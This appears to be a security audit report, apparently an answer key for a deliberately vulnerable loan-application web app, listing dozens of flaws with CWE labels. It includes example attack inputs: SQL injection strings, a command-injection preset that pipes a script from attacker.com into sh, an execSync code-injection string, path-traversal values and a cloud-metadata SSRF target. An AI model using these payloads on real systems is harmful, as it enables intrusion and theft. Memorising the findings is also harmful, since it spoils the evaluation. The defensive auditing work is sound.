extra.message: In searchApplicationsByCriteria (routed at POST /api/applications/search), both the filter field name and value from req.body.filters are interpolated directly into a QueryBuilder expression: qb.andWhere(`app.${field} = '${value}'`). An attacker can escape the quote (e.g. value = "' OR '1'='1") or inject through the field name to alter the WHERE clause, enabling SQL injection and bypassing the borrower scoping filter so any borrower can read all applications.

exportApplicationsByCustomFilter (GET /api/export/applications/custom-filter) builds a raw SQL query with AppDataSource.query() interpolating req.query.term into "WHERE purpose ILIKE '%${searchTerm}%'" and req.query.sortColumn into "ORDER BY \"${column}\" DESC" without parameterization or allowlisting. Both parameters are directly injectable, allowing arbitrary SQL (e.g. term = "%' UNION SELECT ...").

In applyDocumentListLayout (GET /api/documents/workspace-view), the sortBy value is extracted from a base64 XML cookie ('caseViewLayout') parsed from the attacker-controllable Cookie header and interpolated directly into an ORDER BY clause: qb.orderBy(`doc.${layout.sortBy}`, 'DESC'). An attacker who can set the cookie can inject arbitrary SQL into the query.

renderApplicationDossier (GET /api/export/applications/:id/dossier/:preset) builds a shell command string embedding the unvalidated preset path parameter (`wkhtmltopdf --preset ${preset} ...`) and executes it via spawn('sh', ['-c', cmd], { shell: true }). Any authenticated user (including a borrower on their own application) can pass a preset like '; curl attacker.com/shell.sh | sh #' to achieve arbitrary command execution on the server.

previewCustomPricingAdjustment (GET /api/decisions/:applicationId/pricing-adjustment-preview) evaluates the attacker-supplied rule query parameter with new Function('context', `with (context) { return ${rule}; }`)(context). This is direct code injection leading to remote code execution (e.g. rule = "require('child_process').execSync('id').toString()").

serveAuditRecordForPartner (GET /api/audit-logs/partner-feed, unauthenticated) verifies partner feed tokens with jwt.verify(token, PARTNER_FEED_SECRET, { algorithms: ['HS256', 'none'] }). Allowing the 'none' algorithm lets anyone forge an unsigned token ({"alg":"none","entityType":"User"}) and bypass signature verification to read audit log records.

cwe: CWE-347: Improper Verification of Cryptographic Signature

extra.message: GET /api/applications/portfolio-metrics is registered without the authenticate middleware, unlike every other route in this file. The getPortfolioMetrics handler returns every application's borrowerEmail, businessName, amount, status and riskTier to unauthenticated callers, exposing all borrower PII and portfolio data.

cwe: CWE-306: Missing Authentication for Critical Function

extra.message: In getPartnerCaseSummary (GET /api/applications/:id/partner-summary), a borrower who does not own the application bypasses the ownership check entirely by appending ?sharingMode=partner_shared. The query parameter is a client-controlled flag with no server-side sharing authorization, so any authenticated borrower can read any other borrower's case summary (borrower name, business name, product, amount, status, risk tier).

cwe: CWE-639: Authorization Bypass Through User-Controlled Key

extra.message: getCorrespondenceEntry (GET /api/messages/:id) fetches any message by ID and returns it with no ownership or role check whatsoever. Any authenticated user can enumerate message IDs and read other users' messages, including internal underwriter messages containing sensitive case discussion.

cwe: CWE-639: Authorization Bypass Through User-Controlled Key

extra.message: sendAccountRecoveryLink generates the account recovery code with Math.random().toString(36).substring(2, 15). Math.random() is not cryptographically secure and its output is predictable, so an attacker who triggers recovery for a victim's email and reconstructs the PRNG state can predict the recovery code and take over the account via the password reset endpoints.

cwe: CWE-338: Use of Cryptographically Weak Pseudo-Random Number Generator (PRNG)

extra.message: initializeReferralAccount (unauthenticated POST /api/auth/referrals) hashes the temporary password with a single unsalted SHA-256 digest (crypto.createHash('sha256')) instead of the bcrypt hashPassword() used everywhere else. A fast hash makes offline brute-force of these password hashes trivial if the database is compromised.

cwe: CWE-916: Use of Password Hash With Insufficient Computational Effort

extra.message: completeAccountRecoveryAndSignIn (POST /api/auth/recovery/complete-and-signin) assigns req.session.userId on the existing anonymous session without regenerating the session ID first, allowing session fixation: an attacker who plants a known session cookie on a victim can have that session authenticated by the recovery flow. The paired completeAccountRecoveryAndSignInSecurely handler demonstrates the required session.regenerate() fix.

login() reuses the pre-authentication session object (req.session.userId = user.id) without calling req.session.regenerate(), so a session identifier fixed on the victim before login remains valid after authentication (session fixation).

applyDirectorySyncPayload (POST /api/users/:id/directory-sync) JSON.parses the raw ?payload= query parameter and merges it onto the User entity with Object.assign(user, delta) with no field allowlisting. The caller can overwrite security-critical columns such as role, isActive, passwordHash, email and recoveryCode, bypassing hashing and role-change controls (a passwordHash can be written directly).

cwe: CWE-915: Improperly Controlled Modification of Dynamically-Determined Object Attributes

extra.message: The express-session secret falls back to the hardcoded string 'change-me-in-production' when SESSION_SECRET is unset. If the environment variable is missing, any attacker who reads the source can forge session cookies and impersonate any user, since this secret signs all session IDs.

The HMAC key used to sign partner viewing passes falls back to the hardcoded default 'partner-viewing-pass-signing-key'. The pass resolution endpoint (GET /api/applications/partner-pass/resolve) is unauthenticated, so with the default secret anyone can forge a valid signed pass for any application ID and read its status and risk tier without authenticating.

PARTNER_FEED_SECRET falls back to the hardcoded default 'partner-audit-feed-signing-key'. Combined with the unauthenticated /api/audit-logs/partner-feed endpoint, an attacker can mint validly-signed JWT feed tokens with the known default secret and read audit log records.

getPayoutEncryptionKey silently falls back to Buffer.alloc(32, 7) — a hardcoded, publicly-known 32-byte key of 0x07 — when VAULT_ADDR/VAULT_TOKEN are not configured. Any deployment without Vault configured encrypts disbursement bank account numbers with a key that anyone reading the source can derive, defeating the encryption entirely.

cwe: CWE-321: Use of Hard-coded Cryptographic Key

extra.message: uploadMessageAttachment (POST /api/messages/:applicationId/attachments) writes the uploaded buffer to path.join('public', 'message-attachments', req.file.originalname) using the client-controlled multipart filename with no sanitization and no MIME/size validation. A filename such as '../../uploads/shell.html' escapes the target directory, enabling arbitrary file write anywhere the process can write (e.g. dropping an HTML/JS payload into the statically-served /uploads directory).

cacheDisclosureDraft (POST /api/products/disclosure-drafts) constructs the write path from the unsanitized 'disclosureDraftId' cookie: path.join('disclosures', 'drafts', `${draftId}.html`) followed by fs.writeFileSync. A cookie value like '../../../../etc/cron.d/pwn' allows arbitrary file overwrite on the server (the paired cacheDisclosureTemplate handler sanitizes with path.basename).

getDocumentTemplate (GET /api/documents/templates/:category) builds the template path from the 'workspaceLocale' cookie and the :category path parameter without any traversal check: path.join('templates', workspaceLocale, `${category}.html`) then fs.readFileSync. Either the cookie or a category like '../../../client/index' lets any authenticated user read arbitrary .html files outside the templates directory.

retrieveArchivedDocumentCopy (GET /api/documents/:id/archive-copy) joins attacker-supplied folder and fileName query parameters into path.join('archive', doc.applicationId, folder, fileName) and reads/sends the file with no containment check. folder='../../../../etc' style values allow any authenticated user to read arbitrary files from the server filesystem (the Scoped variant adds the missing startsWith(archiveRoot) check).

previewWebhookPayloadTemplate (GET /api/webhooks/templates/:eventType/preview) builds path.join('webhook-templates', `${eventType}.json`) from the unvalidated :eventType parameter and reads the file. An eventType containing '../' sequences (e.g. '../../../server/package') reads arbitrary .json files outside the template root, exposing configuration or data files.

The multer fileFilter validates only the client-declared mimetype (allowed.includes(file.mimetype)), which is fully attacker-controlled, while the stored filename preserves the attacker-chosen extension from originalname (uuid + path.extname(originalname)). A file uploaded via POST /api/documents with originalname 'payload.html' and Content-Type 'text/csv' is saved as <uuid>.html in uploads/ and served from the unauthenticated express.static('/uploads') mount, yielding stored XSS on the application origin.

cwe: CWE-434: Unrestricted Upload of File with Dangerous Type

extra.message: app.use('/uploads', express.static(path.resolve('uploads'))) exposes the uploads directory — which stores borrower compliance documents (bank statements, identity verification, tax returns) — to unauthenticated users. Any document URL, once known or leaked, can be fetched without a session, since static serving bypasses the authenticate middleware entirely.

cwe: CWE-306: Missing Authentication for Critical Function
CWE-538: File and Directory Information Exposure

extra.message: getPartnerEmbedWidget (GET /api/applications/:id/embed-widget) renders app.status and app.riskTier directly into HTML with res.type('html').send(`...${app.status}...${app.riskTier || ''}...`) without escaping. riskTier is an unconstrained string written from decision input (decisionSchema riskTier: z.string(), persisted at line 108), so an underwriter (or compromised staff account) can plant script HTML that executes in any viewer's browser; global CSP is disabled, making the XSS fully exploitable.

getEmbeddableCalculatorWidget (unauthenticated GET /api/products/:id/widget) interpolates the 'widgetDisplayLabel' cookie value into a <script> block without any escaping: `label: "${displayLabel}"`. An attacker who can set the victim's cookie (e.g. via a sibling subdomain or any cookie-injection vector) achieves XSS in the application's origin; the paired getEmbeddableRateNotice handler escapes the same input with escapeForScript().

getPartnerEmbedWidget removes the X-Frame-Options header (res.removeHeader('X-Frame-Options')) whenever the product is partner-embeddable and sends no replacement CSP frame-ancestors directive, allowing the authenticated embed-widget response to be framed by any site (clickjacking). The Scoped variant correctly replaces the header with a restrictive frame-ancestors policy.

cwe: CWE-1021: Improper Restriction of Rendered UI Layers or Frames

extra.message: getPartnerRateFeed (GET /api/products/:id/rate-feed) reflects the caller's Origin header verbatim into Access-Control-Allow-Origin with no allowlist, while the app sets credentials: true globally. Any malicious site can therefore make authenticated cross-origin requests to this endpoint and read the responses, defeating the same-origin policy.

cwe: CWE-942: Permissive Cross-domain Policy with Untrusted Domains

extra.message: acknowledgeAndReturn (POST /api/notifications/:id/acknowledge-and-return) redirects to the raw 'x-redirect-url' request header (or Referer) without any validation: res.redirect(returnTo). An attacker controlling the header value can redirect the user to an arbitrary external URL (e.g. https://evil.com/phish), enabling open-redirect phishing. The acknowledgeAndReturnSafe handler allowlists destinations.

cwe: CWE-601: URL Redirection to Untrusted Site ('Open Redirect')

extra.message: lookupComplianceRecord (GET /api/documents/:id/compliance-record) interpolates the raw record_type query parameter into the XPath-style expression `/tenant[@id='${doc.applicationId}']/document[@type='${recordType}']` without escaping. A record_type containing quotes can alter the predicate and match documents of other retention types/tenants. The Verified handler escapes quotes and allowlists record types.

findEscalationContact builds an LDAP filter by direct interpolation of the employeeUid query parameter: `(uid=${employeeUid})`. Employee UIDs like '*' or '*)(objectClass=*)' alter the directory filter semantics (wildcard/enumeration of the staff directory). findEscalationContactSafely demonstrates the required escaping.

sendWebhookTestPing (POST /api/webhooks/:id/test-ping) fetches an arbitrary URL taken from the 'x-test-endpoint' request header with no scheme/host validation. This permits server-side request forgery against internal-only endpoints (e.g. http://169.254.169.254/ cloud metadata, internal admin services) from the server. The Safe variant restricts hosts to an allowlist.

applyDocumentListLayout base64-decodes the 'caseViewLayout' cookie and parses it as XML with xml2js without any DTD/entity restrictions. The cookie is attacker-controlled, so an XML payload containing DOCTYPE/ENTITY definitions is processed by the parser (billion-laughs entity expansion / external entity processing depending on parser configuration). The Safely handler rejects markup containing <!DOCTYPE or <!ENTITY.

cwe: CWE-611: Improper Restriction of XML External Entity Reference

extra.message: importLegacyQueueLayout base64-decodes the 'legacyQueueLayoutXml' cookie and parses it as XML with xml2js without checking for DTD/entity declarations, exposing the server to XML entity expansion/external entity attacks via an attacker-controlled cookie. The Safely handler blocks markup containing <!DOCTYPE or <!ENTITY before parsing.

cwe: CWE-611: Improper Restriction of XML External Entity Reference

extra.message: exportDocumentPacket (GET /api/documents/:id/packet) places the raw export_name query parameter into the Content-Disposition header (`attachment; filename="${label}"`) without stripping CR/LF characters, allowing HTTP response header injection. The exportReviewedPacket handler sanitizes the same input with .replace(/[\r\n]/g, '').

simulateDecisionOutcome returns err.stack and internal error details in the HTTP response whenever mode=trace is passed, exposing server stack traces, internal paths and library versions to API clients. The Safely variant logs server-side instead.

cwe: CWE-209: Generation of Error Message Containing Sensitive Information

extra.message: generatePortfolioSummary returns err.message and err.stack to the client on failure (res.status(500).json({ error: err.message, stack: err.stack })), disclosing internal stack traces and configuration details. The generateComplianceSummary handler correctly logs server-side and returns only an error ID.

cwe: CWE-209: Generation of Error Message Containing Sensitive Information

extra.message: syncBorrowerTaxProfile logs the entire request body to the error logger on failure (logger.error(..., { userId, payload: req.body, error: err })). The tax-sync payload contains EINs and beneficial-owner records, so sensitive borrower PII is written to application logs. The Safely handler logs only status/method/path.

cwe: CWE-532: Insertion of Sensitive Information into Log File

extra.message: pushProfileToPartnerCrm defaults to the cleartext http:// CRM gateway URL and sends the CRM API key as a URL query parameter (?api_key=${apiKey}) in a GET request. Credentials in URLs are logged by proxies/servers, and cleartext HTTP exposes the key and borrower business data to network interception. The Secure variant uses HTTPS with a Bearer header.

cwe: CWE-319: Cleartext Transmission of Sensitive Information
CWE-598: Use of GET Request Method With Sensitive Query Strings

extra.message: updateDisbursementAccount (PATCH /api/payouts/:id/account) merges the entire request body onto the DisbursementAccount entity with Object.assign(record, req.body) and no field filtering. A borrower can overwrite the record's applicationId (and id), re-pointing their payout/disbursement record at another borrower's application and diverting funds to their own bank account. The Validated handler allowlists the three editable fields.

cwe: CWE-915: Improperly Controlled Modification of Dynamically-Determined Object Attributes

extra.message: submitVendorRemittanceMemo decrypts attacker-supplied ciphertext with AES-256-CBC (crypto.createDecipheriv('aes-256-cbc', ...)) without any MAC/authentication, and returns distinguishable 'Malformed remittance memo padding' errors, creating a padding-oracle condition through which an attacker can decrypt arbitrary ciphertexts encrypted under the payout key. The Sealed variant uses AES-256-GCM with an auth tag.

cwe: CWE-327: Use of a Broken or Risky Cryptographic Algorithm

extra.message: issuePartnerViewingPass signs a pass whose payload is only the application ID (`${id}`) with no expiry timestamp, and the unauthenticated resolve endpoint accepts these passes forever. Once issued (or forged using the default signing key), a pass grants permanent read access to the application's status and risk tier. The Scoped variant embeds and enforces an expiresAt claim.

issueVendorStatusPass sets the 'vendorStatusPass' token cookie with only a 7-day maxAge — no httpOnly, secure, or sameSite attributes. The bearer token is exposed to JavaScript and transmitted over cleartext connections, and its 7-day lifetime is excessive. The Secure variant sets httpOnly/secure/sameSite with a 1-hour expiry.

completeMarketplaceLink stores the accounting-partner access token in the 'marketplaceSession' cookie with no httpOnly, secure, or sameSite flags, leaving the OAuth token readable by any injected script and transmitted without transport protection. The Secure variant sets all three attributes.

resumeReviewContext generates the review context token with Date.now().toString(36) + Math.random().toString(36).slice(2) — a predictable, non-cryptographic value — and sets it in a non-httpOnly 'reviewContext' cookie. Predictable session context tokens can be guessed or forged. The Secure variant uses crypto.randomBytes(32) plus session regeneration and a hardened cookie.

cwe: CWE-338: Use of Cryptographically Weak Pseudo-Random Number Generator (PRNG)

extra.message: applyReviewQueuePreferences JSON.parses the 'x-queue-preferences' request header and merges it into the session-stored preferences with Object.assign(config, overrides) with no key filtering. Arbitrary keys (including '__proto__', which Object.assign routes to the prototype setter) are persisted into the session state. The Safely handler allowlists preference keys.

cwe: CWE-915: Improperly Controlled Modification of Dynamically-Determined Object Attributes

extra.message: escalateOutstandingReminders accepts an unbounded nudgeCount query parameter and creates that many notification rows in a loop (for (let i = 0; i < requested; i++)), with no upper limit. A single request with nudgeCount=100000000 exhausts database and memory resources (denial of service) and spams the borrower. The Throttled variant caps it at 5.

nominateCoBorrower returns a distinct 'No account found for that email' error when the nominated email is not registered, allowing callers to enumerate which email addresses have accounts on the platform. The nominateCoBorrowerReviewed handler returns a generic response regardless of account existence.

importBorrowers assigns the hardcoded default password 'ChangeMe123!' to every imported borrower whose CSV row lacks a password. Since the default is public in source, anyone can authenticate as any imported borrower account before the user changes their password.

Helmet is configured with contentSecurityPolicy: false, disabling the Content-Security-Policy header for all responses. This removes the key mitigation for the multiple XSS vectors in the application (embed widgets rendering unescaped values, uploaded .html files served from /uploads), allowing injected scripts to execute without restriction.

The seed script provisions all demo accounts — including admin@example.com and underwriter@example.com — with the hardcoded password 'DemoPass123!'. If seeded data persists into any internet-reachable environment, anyone with the source can log in as an administrator.
